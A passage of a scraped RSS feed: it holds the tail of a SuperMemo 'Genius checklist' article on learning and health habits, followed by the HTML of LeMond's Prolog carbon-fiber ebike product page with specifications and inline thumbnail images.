<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>
</p>
<h3><span id="Negative_emotion">Negative emotion</span></h3>
<p>Learn to control and eliminate negative emotions that blur your mind and long-term vision. The only acceptable feelings towards others should be positive, in particular …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Genius_checklist">https://supermemo.guru/wiki/Genius_checklist</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Genius_checklist</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229772</guid>
            <pubDate>Fri, 27 Nov 2020 16:07:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Greg LeMond’s New 26 LB. Carbon Fiber Ebike]]>
            </title>
            <description>
<![CDATA[
Score 186 | Comments 294 (<a href="https://news.ycombinator.com/item?id=25229754">thread link</a>) | @gjlemond
<br/>
November 27, 2020 | http://Lemond.com/prolog | <a href="https://web.archive.org/web/*/http://Lemond.com/prolog">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><main><div display="flex"><div display="flex"><p><span font-size="34" font-family="display" font-weight="600" color="text.black">Intro</span></p><div width="1,,0.25" order="2"><div display="flex"><p font-size="15" font-weight="300" letter-spacing="0.02em" color="text.black" font-family="text">Unparalleled versatility is at the core of the LeMond Prolog. This everyday carbon fiber ebike designed by Greg LeMond delivers relaxed racing geometry for easy handling and maneuverability at 26 pounds.</p><p font-size="15" font-weight="300" letter-spacing="0.02em" color="text.black" font-family="text">Greg’s experience and expertise in carbon fiber and ergonomics inform all aspects of the bike design. The minimalized contours and precision components of Prolog converge, rendering an unprecedented ebike.</p><p font-size="15" font-weight="300" letter-spacing="0.02em" color="text.black" font-family="text">Integrated front and rear lights are powered by a lightweight battery housed in the downtube. The battery is part of the Mahle X35+ Smart Ebike System that provides a range of 45 miles with 3 levels of assist, achieving a top speed of 20 mph via a 250 watt rear hub motor.</p></div></div><div width="1,,0.25" order="3"><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">LeMond is reshaping the future of ebikes by expanding their accessibility to all riders. This can only be accomplished by ensuring the entire build is lightweight.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">Carbon fiber was used to optimize every LeMond made component. These include the frame and fork, a monocoque handlebar-stem, custom carbon fiber fenders, seat post, as well as a custom carbon rear rack and front basket. In addition, LeMond teamed up with Munich Composites to develop a state-of-the-art carbon braided wheelset with tune hubs, as an upgrade option.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">An 11-speed Shimano drivetrain combined with a lightweight build allows the Prolog to ride well over any terrain. Shimano’s Di2 electronic shifting is also available as an upgrade.</p></div></div></div><div display="flex"><div display="flex"><p><span font-size="34" font-family="display" font-weight="600" color="text.black">Colors /<br>Electronics</span></p><div width="1,,0.25" order="3"><div display="flex"><div display="flex"><p><span font-size="15" font-weight="300" color="black" font-family="text">matte finish; black<br>decals</span></p></div><div display="flex"><p><span font-size="15" font-weight="300" color="#C7C7C7" font-family="text">matte finish; silver<br>decals</span></p></div></div></div><div width="1,,0.25" order="4"><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">Months went into testing and sourcing the optimal ebike system for weight, performance, and durability. The Mahle X35+ Smart Ebike System provides all of the features and characteristics required for a quick, lightweight, and elegantly designed ebike. At just 7.7 pounds, it is one of the lightest systems on the market.</p><p font-size="15" font-weight="400" letter-spacing="0.02em" color="text.black" font-family="text">•&nbsp;Assistance up to 20 mph<br>• Range of 45 miles on average<br>• External battery (sold seperately) increases range by 70%<br>• Powered by a 250 watt, 36v rear hub motor<br>• Mahle mobile app tracks ride data and integrates with Strava</p></div></div></div><div><div display="flex"><div display="flex"><p font-size="15" color="white,,black" font-weight="300" letter-spacing="0.02em" font-family="text">An always on integrated 500 lumen headlight within our monocoque handlebar-stem provides visibility for the road ahead.</p></div></div></div><div display="block,,none"><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Birdseye_Mobile.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Birdseye_Mobile.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCABxADIDASIAAhEBAxEB/8QAGwABAQACAwEAAAAAAAAAAAAAAAECBgMEBQf/xAA1EAABAwMDAgQDBAsAAAAAAAABAAIDBAUREiExBhMHQVFhInGBFDOhsQgVIzJCQ2NygpPB/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAH/xAAWEQEBAQAAAAAAAAAAAAAAAAAAARH/2gAMAwEAAhEDEQA/APvRUREBAcrCQ4Y4+gP5LSfBWR0nhzbXPcXO7k+5Of5rkG8qqBEGSLFEBCinqgwmOIn/ANp/JaL4IPa7w6oGjlkszT/sJ/6vf6zq62hsctTQyQx9v7x0kZfhp2yAPfHkVyW+CSk6guNPA2nit+iN8cMcWktcWgE5Bxvj08kHtBVQcKoCIiDx+qLtWWehjmt1lrbxPJJ2+xSlrS3YnU4ngbY+q0ttu6sv9yoXVlFVWG3Ml1TObenvnMeN2Na0YG+Dk5IxyvphUPCDoRWumZBHC59XK1uBmSdzi7B/iJzlc1wt9LUVTptdS172tBdBOWNOM42C5/MZ4yF16J9c+mi/WzKeOuAIlbTnLB8Rxj/HT9UHzW99NdY27qeGrsVwrbxbS10j4K24dl0b8n4WluB55GQRsc+S2npS+Xiqrjb7t0vcbWGRl4qpals8TyDxqG+Tnb5LagsggIiIChVUKDhqMdp+TpGk7+my8Xqy5XSC4wU1lpY5Zpi4vL+Q1jIzlo4P7+Pou3fbqy1todcMkv2urjpGhnLS/PxH2GkrhrNc3XkR1Sdqnt7iAW/CXPewbH5N/FB3rO+sktsDrlG2OsLT3Gt4Bycfhhd4LELIICIiApjOyqiDRbz1FQ3C6W2npDKZqaeepzJHhv7KCXcHPkT5rDwivNdfulaevutQ6prHa2OlcAC4B5xnHoDhef42V0nT/SEklppoYZrhN9lnqGRgOaxzXE7jzOMZ9ytS/R7utaLrV2gYkt/ZdPx90/Ixj55xj2QfeWrILELIICIiAoVVCg0Lxlbq6Pk1UpqI2TROeCzU3SZGtIJ5HPI3xnjKzt9ut/S/VcNrstFR0kM7WuyS50spJGoAk8BoPst0qoo5oXxzMbJG4Yc1wyCPcJU0lPLVU9RJCx08TQY5CPibkEc/IlF2uUcLIKBVEEREBFSog45tonH0GUid3Ionf02/ks3AOBBGQdipGwRsaxow1owAgyCIqgIqiCFREQEREBUIiCoiIP/Z"></picture></div><div display="none,,block"><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Overhead.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Overhead.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA1ADIDASIAAhEBAxEB/8QAGwABAQACAwEAAAAAAAAAAAAAAAECBAMFBwb/xAApEAABBAICAQIGAwEAAAAAAAABAAIDBAUREiEGMUEHEzJhgZFCUXGx/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/APe0RQoAG3Ae5Olp4q/Hk8fDcha5scu9B3qNOLf+hZ2LkNZ5DpIzM1pe2IvAc7XfQK6rxx8GOxVajNYjZIxzmsbI9rXP2S/6d7/lr8INryjKnB+NZXKiB1g0aslgRN6L+LSdLxP4JfGPP+X+bHDZyrUfDYiklikrRFhhLBy0eztpHXfe9dr35zQ5pa4AtI0QRsEf0V0vj/iXj/jtmxYweHpUJ7HUj4I+JcN719hv2Ggg71ERAU91Vig66liKFCeWxWrhs8mw+Vz3PeRvetuJIG/YdLjv1cbmZBTykVSzYhIm+Vvboz6Bw9HD19elsZe4yjj5p3yRRuDSI/mHTS/R4j8lavjtqHI1X5Gvsx2nlzSWcSA0Bmv20/tB2VSvHUrR14A4RRji0OeXnX+uJJ/JXMFFQgqIiAoVVCg0M1G+XE3WQ8xKYJBGWfUHcToj779F898McRNgfGxjbE0874X8+creOubQ7TRs9Df72vryNhYs2WtLho6GwgyWSgVQEREBERBCiIgqIiAiIg//2Q=="></picture></div><div id="features" display="flex"><div display="flex"><div width="1,,0.25" order="1,,0"><p><span font-size="34" font-family="display" font-weight="600" display="none,,inline" color="text.black">Features</span></p><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">Carbon fiber frame and components</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">Prolog’s carbon fiber frame, fork, fenders, seatpost, and monocoque handlebar-stem  makes it one of the lightest ebikes on the market.</p></div></div><div width="1,,0.5" offset="0,,0.16666666666666666" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Headtube_Profile_Features.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Headtube_Profile_Features.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAABAAICAwEAAAAAAAAAAAAAAAMIBAYCBQcB/8QANRAAAQMCBQMDAQMNAAAAAAAAAQIDBAARBQYSIUETMVEHImEUCEKBFSMyM1RicYKRk6HR0v/EABgBAQADAQAAAAAAAAAAAAAAAAABAgME/8QAHxEBAQABAwUBAAAAAAAAAAAAAAECBBExEjNSodET/9oADAMBAAIRAxEAPwCw9KUoOtzJiX5Gy/iOJBvqmJHW8EE2CrDk8DyfF68lyF6tzJmZGMOzK9hxYmnSy9HQWuiv7oVckFKuwPe9euTphafDCmklC9iVb3uDx42t+NVW9TYGARcazHCZw5WBYjEUHIqI7mpiU2q25Sb6FEXItYcW2oLckEGxFj80qtXo9gudcUiqdy/np6NhzJSFMSkKfLd03ACFApI24IPwNqsokEJAUbkDc2tc0H2lKUA7d9qgckoQqxtbzcVF9Dq/WvuK/htXNMGOnu3qP7xJoMGc4xJdRdwgJ4AFzvfvUz2E4dNgPsyYjDzMpHSfStAPUAG1z35NvHFJ8dk9JKGkJWFagUpsQKyYrqG0LSs2Tbv4NBBguEwMEgNwsLitRoyAAEoTa5AAuTybAbms+uDTiHm0uNqCkKFwRzXOgUpSgVG882yEl1aU6laU3NtSuAPnapK0F2ZKzZmhtmOhljCMCn63nFLPWdfQkhKNFvan3Xue4tQbiAVqK+6ldhWGVOsSyy+1qDgOlST7VDkb812bSQhGte23PArSvUbPmD5XiJTMdU5NJC2YjCdby/B0/dB8m1+L0G7R2W47CEMoS23uQkEmxJudz8kmpFEJTdRCU+SbCtXxyRJxfIcmTgU56JI6AktPNJuvSBqUkDvcpuPN6ri/iuHznSqS7jeLvHfU8+Rf+X3GqZZ7Xba1aY2y1bD6uL+1xv7yf90qp4ZjkAjLE0/g7/zSo674319X/OeU9/FpMyOLZwSUtpakLATZSTYj3p5qZKUhQISAVKurbvvbf+gpStGT7iJICNzyf8VVHLbi5AzFNkLU7NCVq+oWdTl9ShfUd70pXNrOzk6NL3cXtv2d3XHvT3Dy64tw9R0XUSdtZ2recLgRIOAOiFFjxh+fFmWwjlXgUpXRjxGGXNdrEdc+lZ96v0Bz8UpSpQ//2Q=="></picture></div></div></div><div display="flex"><div width="1,,0.25" offset="0,,0.08333333333333333" order="1,,0"><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">Integrated motor</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">A 250 watt rear hub motor powers Prolog up to 20 mph and is part of the Mahle X35+ smart ebike system embedded throughout the frame.</p></div></div><div width="1,,0.5" offset="0,,0.16666666666666666" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Motor_Features.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Motor_Features.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAAAAgMAAwEAAAAAAAAAAAAAAAcEBQYBAwgC/8QANBAAAgEEAQEGBQEHBQAAAAAAAQIDAAQFEQYhBxITMUFRIjJhcYEUFiMzQlKhsXKRksHh/8QAFgEBAQEAAAAAAAAAAAAAAAAAAgAB/8QAIhEAAgAFAwUAAAAAAAAAAAAAAAECETFBYRIy8CFRcaHB/9oADAMBAAIRAxEAPwD0PWU5/wAyteJY4SSBJbyRSYombSgDoXc+YXfTp1J6D11q/wA6+tIvE2q9oHalf3l+nj4nGEOIW+WVuoijP2UFtep370Im6K4oUqsjQ5btJ5MgvcYmSjtXI8NkaK1RgTod1WBJH1JNSMV2m8g4zko7PmdrPNbMNs0sQS4jX+sFfhkX7dacDSBJAe9vajR9yGXR/K/4NUXJsdjc5ajH5S3WaBFSQOT3TGwG9hh1GtkHXnvVbKVGU52L+O8sMta2U9tPFc21wPEjZTsOpHnU+OGKP+HGif6VApH9lvJLuLm2QwGcihhkCH9BHGgRLfw9ExoP6SmmHr/uaeYpJzC+hzRRRURFyjmPGXrr0ZYJGH3CE0rewe3R8Fm5/hEs2SZSQ/dcBEUD/NNmeITwyQt5SKUP5Gv+6UPYxJ+nk5Tg7jo8VyJyjKPlde431+ZddPeg968P4NbXzuajmGfjwuMlu5PDndg0cSK3d8ST5hojoPLfT61ieGdpeL5LnrLCvazxPcM58PQ33kGxG306E9PPp7VXZeyz2G7Qcfx6eOHI2GamDK95+9GlQhQNaKmMDWx6HfXzrU8f4BibRLfI2kFza3UzPJBLFP4picgA6LDfoQFO/X3pgMt20K2B7ReOcgiUxs7RM/w90fA4Qj/g4H4p+QMGiUjy1Xn3t1sshLh8VNIrXkdu7xNIrhT32KkAL5/yEnz1qmDwLtEtcxNNj8lDHZ5GKFZwkcwljlRhsd1h6jY2D1G6xXNYxaKwU8eTmnklXN3yK7FgqKoVQT5Dp5UVphvNik5zdZeE9olryi2iL2N0GW5UDfwn5/yp04+59jTZct6GqjkFimWxstneReJE/UEHTIw8mU+4/wDPI0Yk3SooXKpVY7DQXPLRyzHZJro3NoI4knPiRIuie8mjtSwXqKtLR7mK2ME1qkiMA6mOQaDa69G1oHR9fek5LBybg00yY0zjHMxbu+A00B303pdtGdenUfWui9z3MeZxNYWsbvbyfDIlrA1vEw35SSvo936DrWa8Pno3Rkhc5zeR5fzWV+PiS5s7OIukXe14ixqwLEdR3mZmUH10PeqfAcQzt1n3/YhmuUsgji9mi/Tr8SjaEP0LA7BGv5d09uzPiVvxDHSl5UuMpdaNzOo7qgDyjQeiD+9bUS7pLIXgVUWN7WFjRS/FiQANlDv+xopr+IKK0w+GrpeiioiLOB7VQZVFQh0VVb3A0aKKiJOPdig2zH7mreAn3NFFREjdFFFRH//Z"></picture></div></div></div><div display="flex"><div width="1,,0.25" offset="0,,0.08333333333333333" order="1,,0"><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">Monocoque carbon fiber cockpit</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">A monocoque carbon fiber handlebar and stem encase the headlight and creates a strong yet minimal form.</p></div></div><div width="1,,0.5" offset="0,,0.16666666666666666" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Cockpit_Overhead_Features.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Cockpit_Overhead_Features.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAGwABAAIDAQEAAAAAAAAAAAAAAAIDBAUGAQj/xAAxEAABAwMCAwUGBwAAAAAAAAABAAIDBAUREiEGMUEHUWFxgRMUIjJysTM0QlJioaL/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8A+h0REBF45wAJPIDK03B/EEPE/D1Ld6aCWCKo1gRyEFzdLi3cjbplBukREBERBrLze6G0QOkq549TcZiEsbZCO8Bzhlcfb+1Clu97mtlisV1uc0UbZXPp3waWsJxlxMnw79Dus6o7MOEKq9VV0rbQ2rq6mUzSe3le9mo88Nzj0XR2uzWu0Rllqt1HRMPMU8LWZ8yOaCxtRPJhklG+IPGNRlY7TkdQD9srWcMWQcJ2Gks9vZPWww6yJJHsaficXb8upPILZXCvgoPdzUO0+2mbCzIOC53IZ6Zx16q/U5kgilLnPDdRcW46+GwQcZxb2iRcKVMcd3sdyZFK8MjqWyQmJxP8teRjxAW6sHF9ovbNVLUxx9wmmiBceoADyT58u5ZF64dtN8kppLpRRTyU7w9jiN/pP7mnq07FaC7dlfBVzJdLYaaB5/XSl0J/ycf0g7hFRQ00NFRU9JTtLYII2xRguJIa0YG557BEFqiVIqLkGHcaWCshaypiEjWSMlaCcYe1wLSPEEKix242e2wW91ZPWugBzPP879Ti7fyzj0WZMcNJOcDuGVKQn3iTIwNseOyC0KQVbVYEBERAKgURBjVf4En0lWS/mH+n2REFjVMIiD1ERB//2Q=="></picture></div></div></div><div display="flex"><div width="1,,0.25" offset="0,,0.08333333333333333" order="1,,0"><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">11-speed drivetrain</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">An 11-speed Shimano GRX drivetrain provides the gearing and performance needed to traverse any terrain- with or without a motor.</p></div></div><div width="1,,0.5" offset="0,,0.16666666666666666" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Gears_Features.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Gears_Features.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAHAAAAgIDAQEAAAAAAAAAAAAAAAcDBQIEBgEI/8QAOBAAAgEEAAMEBwYFBQAAAAAAAQIDAAQFEQYSIQcxQVETFCJSYXGRFTJTgZKxI0JiY3KCocHR8P/EABcBAQEBAQAAAAAAAAAAAAAAAAACAQP/xAAbEQEBAQADAQEAAAAAAAAAAAAAAQIRMUESkf/aAAwDAQACEQMRAD8A6O+7Tc5mb2S04UxcjFDoiKL1iRf8m2I0+W2qMX3alETM9leumyORGtXbp3+zofvTPx+OtMRjEs8XbJb2kYKpGi60fFW8z8T41tSTAWxcdeZn5deO+g/eomb7VfU8hYYPtZlt771HiqxeCRRtnELQyoPeaI75l+KE/KmtHPFN6CeNueORRyOB0IYbH/FUmWxFnnFga6t4XeBue2maJXdJANKyc3gvQ6PQ62aXPZ/l8lgeLb7hnO3BmeeYoZSxIM5HNHKpPhIBoj3h86S2d9Kuf06aKxjcSRrIO5gGqK8uY7S3aaZlVRoDmOtsTpRvzJIH51bmnoqgW1yk6iZ8pcWjSDnNv6KJvRE9eTeuuu7fwooJMtcTYuwub0iOWGGMs6O42VA7t+NcDa8UZK4wF3cYaNMlkreQlbIjlVN7I0e9ydHuJI8epphXNlbSwsbyMTIVOkcaBGup14D/AN8KUHDfDuLm7QkfDXE0tli2IyMcrBYvSNsJGg0Cx7yzHoDQNbEXN5fY63up7KaBpYwzQ6VWQ+KkMdjR8NfPdK7toP2fxNhsnpreZrZxt2XqYZFdSOXy5iPzptxxxwcohn1GfuguPp17j/t8qWed4jyj9obYKyks8jZyPFCfW7NT6s79XAYd4VAW6+Ohs1O+lY7ddJ2g8P2F5f2t1cThbOUCeaOBpIbfn6hZHUEKdkjrVvdWgzOUx9z6xHLjLcenjjTqJZT91ye4qo6j4mvnniXDX8QksYXnsbyzjgt3tYUldsowdtyx8nst3822IOyR01TH4Q7P+MLPB2KS8b5HGajBNhFAkiwbO+TmJ66/7qkm3yr5CisYVZIUWRzI6qAzkAFj56HQbooF5gO0fD5KKKLMSri719bEzfwpTvvSQeyVHluuily/D6QNNLf4pQQ7O5lj9rr02d9e6q3O9nOGy0kkqI9hNIeZ2tNKrnzaM7Qn463XOR9i9isoY5aXW/5bGBW+vKf2qOdzxfGWHFnaTZJbyWnCiR3dxIfRG9aLcKb7io1uSTwAA61a9lPBUmGjbLZdH+0Z1IjjlPM8asdsz/3GOt+QAHnV5w7wVjMDKs9nEJbwDQurkmWQD+knov8ApAro+Sf8Rf00mbbzplsk4jYHsjS9B8KK1+Sf8Rf017yz++v0q0p6Kg5ZvfX6UUE9FFFAUUUUBRRRQFFFFB//2Q=="></picture></div></div></div><div display="flex"><div width="1,,0.25" offset="0,,0.08333333333333333" order="1,,0"><div height="100%" display="flex"><p><span color="text.black" font-family="display" font-weight="600" font-size="18">Custom fenders &amp; tires</span></p><p color="text.black" font-family="text" font-size="15" font-weight="300" letter-spacing="0.02em">Custom LeMond carbon fenders and Panaracer tires come standard.</p></div></div><div width="1,,0.5" offset="0,,0.16666666666666666" order="0,,1"><div><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Power_Button_BLK_Fender_Feature.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Power_Button_BLK_Fender_Feature.jpg" type="image/jpg"><img src="data:image/jpg;base64,/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAyADIDASIAAhEBAxEB/8QAGwAAAQUBAQAAAAAAAAAAAAAAAAMEBQYHAgH/xAAxEAACAQMDAwMDAgUFAAAAAAABAgMABBEFBiESMUEHE1EUInFhgRUWJDIzQlKRkqH/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAgH/xAAeEQEBAAICAgMAAAAAAAAAAAAAAQIRITJR8EGBwf/aAAwDAQACEQMRAD8A3271Gys5Yory9tbeWXPtpNMqF8d8AkZp0OQCOx7Hwaq29Nhbc3oYH3DYGeaBSkU0crRuik5IyO4zzzUVtb0w07a2r/W6Nq2tpD0Mn0c90ZIefOMA5HitYv1FNozJG4jc9eclW5Pbvn4/5rtLiMyFPcQuPAPNAtRR5x574ooCiiigK5kkSKNpJXVI0BZmY4CgdyT4Fek4pOVFlR45USRWHSyOMrg+CPP4oIi3ubPV1i1PTb5ZLNiU9yMkpIVJBx88+RkcVKxok0KiSNWxxhlBprLDEkiYQCG1TIVVwF47ADt+BUZf6wLbQ7nVrSK4v1Cqq20IyXcnA47juM/oO1Bm3qrtTcVzvLTLrbe44tLtlt2KPd3/ALQt3Dcov+ohsj5Awc4GBUbZ+rW6NjXEGlepOiS3PV/i1C3dczL8gj7JP2Kn5FTuobF1bdF2NS3Hd2MN86lIoBbCZYEGG6eTjH3eMnPk0r6axgahqm0des7a4toSSbWRBJCrgBg8at2VlOcfIyMZNRc9WbnCpjucVpFpuDS7q1huI7xFSVFkUOrKwBGRkY4P6UVJRxRxxqkaIiKAqqqgAAdgKKtIGW7ZA+fJ/FN9TvYNL0y6vbgqkFtE0rEnAwBnH79v3p1VE9VdWkgsYNN07VoNP1aT+rhDL1vN7bDEar5LMQOQex4+AT2jrxu9FvtSn1Ga50d8XMd5cQiJ1TpJlUAYyqnhSefHOM0jtK/vG1K51PUpHgj1JUe3sieIIAelSR/uPUpY/qKS12I6jPpG3Qv2Xj/U37W8AQezFycqv2gvJgY84PeoXf66rY7rOqQ9eopb26Jb6VbAJ7vUcF5mOeergKoJwAePGfLWjxsyyLHKuWEeCoPcdWTz8EhR+Aap+gIJ/WnWpYz1LFZwiRh5cxnP4/uH/lL7N1/+P2bXF/btZTwJ0XcFwekBo+GYkDlQeoYz4Brv0qje8fWtxXClZNVumeMEYIiHCD/qFqc+dT3y3HjdaJRXHX+tFWl6azvdFvDJu83MkUbXFvPZrDKygvGGRshT3APnFFFA4S4m/mmC392T6c2IYxdR6Sesc47Zp9qiIml27IqqzR5JAxkmRMmiikKhN0MYdj6yIiUDW7Z6eM5ZQc/sSKs21FCaBYqgCgRDgcUUVN7T7/FTrffKaHaiiiqS/9k="></picture></div></div></div></div><div display="none,,block"><picture><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Rear_Centerfold.webp" type="image/webp"><source srcset="https://cdn.lemond.com/images/pages/prolog/Prolog_Rear_Centerfold.jpg" type="image/jpg"><img 